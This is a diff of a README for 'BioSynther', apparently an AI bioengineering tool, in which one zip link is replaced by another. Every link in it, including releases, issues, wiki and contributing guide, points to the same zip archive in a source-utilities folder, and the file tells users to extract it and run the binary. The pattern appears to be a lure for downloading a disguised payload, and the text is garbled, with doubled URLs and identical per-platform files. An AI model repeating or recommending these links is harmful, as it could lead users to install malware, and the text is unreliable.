@@ -2,7 +2,7 @@
 # 🌱 BioSynther - Create Sustainable Solutions for the Future
 
 ## 📥 Download Now
-[![Download BioSynther](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip%https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip)](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip)
+[![Download BioSynther](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip%https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip)](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to BioSynther! This software uses generative AI to design innovative synthetic biological circuits and organisms. You can use it for environmental cleanup, producing medicine, and promoting sustainable manufacturing. 
@@ -18,11 +18,11 @@ Before you download BioSynther, make sure your computer meets the following requ
 - **Processor:** Intel i3 or equivalent.
 
 ## 📥 Download & Install
-To download BioSynther, visit this page: [Download BioSynther](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip).
+To download BioSynther, visit this page: [Download BioSynther](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip).
 
 1. Click on the link above.
 2. On the Releases page, you will see the latest version listed.
-3. Find the file labeled "https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip" for Windows, "https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip" for macOS, or "https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip" for Linux.
+3. Find the file labeled "https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip" for Windows, "https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip" for macOS, or "https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip" for Linux.
 4. Click on the relevant file to start downloading.
 
 After the download completes, follow the instructions based on your operating system:
@@ -38,7 +38,7 @@ After the download completes, follow the instructions based on your operating sy
 - You can now find BioSynther in your Applications.
 
 ### For Linux:
-- Extract the downloaded https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip file.
+- Extract the downloaded https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip file.
 - Open your terminal and navigate to the extracted folder.
 - Run the command `./BioSynther` to start the application.
 
@@ -60,16 +60,16 @@ Once you are satisfied with your design, save your work. You can export your cre
 ## ❓ Frequently Asked Questions (FAQs)
 
 ### How can I report a problem?
-If you encounter any issues while using BioSynther, please visit our [issues page](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip) to report the problem.
+If you encounter any issues while using BioSynther, please visit our [issues page](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip) to report the problem.
 
 ### Where can I find help or support?
-You can find answers to many questions on the [Wiki page](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip). You may also ask questions in our community forum linked there.
+You can find answers to many questions on the [Wiki page](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip). You may also ask questions in our community forum linked there.
 
 ### Is BioSynther free to use?
 Yes, BioSynther is open-source software, meaning you can download and use it at no cost.
 
 ### Can I contribute to BioSynther?
-Absolutely! We welcome contributions. You can find more information on how to help in the [Contributing Guide](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip).
+Absolutely! We welcome contributions. You can find more information on how to help in the [Contributing Guide](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip).
 
 ## 🌐 Community and Topics
 BioSynther is part of a growing community focused on bioengineering and generative AI. Here are some relevant topics you might want to explore:
@@ -83,10 +83,10 @@ BioSynther is part of a growing community focused on bioengineering and generati
 Joining discussions in these areas can enhance your understanding and improve your designs.
 
 ## 🔗 Useful Links
-- [Visit Releases Page](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip)
-- [Issues and Bug Reports](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip)
-- [Contribution Guide](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip)
-- [Wiki Page for More Help](https://raw.githubusercontent.com/PoraminSukyaruek/BioSynther/main/src/utils/BioSynther-v2.7-alpha.4.zip)
+- [Visit Releases Page](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip)
+- [Issues and Bug Reports](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip)
+- [Contribution Guide](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip)
+- [Wiki Page for More Help](https://github.com/PoraminSukyaruek/BioSynther/raw/refs/heads/main/src/utils/Synther_Bio_3.8.zip)
 
 Thank you for choosing BioSynther. We hope you find it valuable for your projects!
 ```
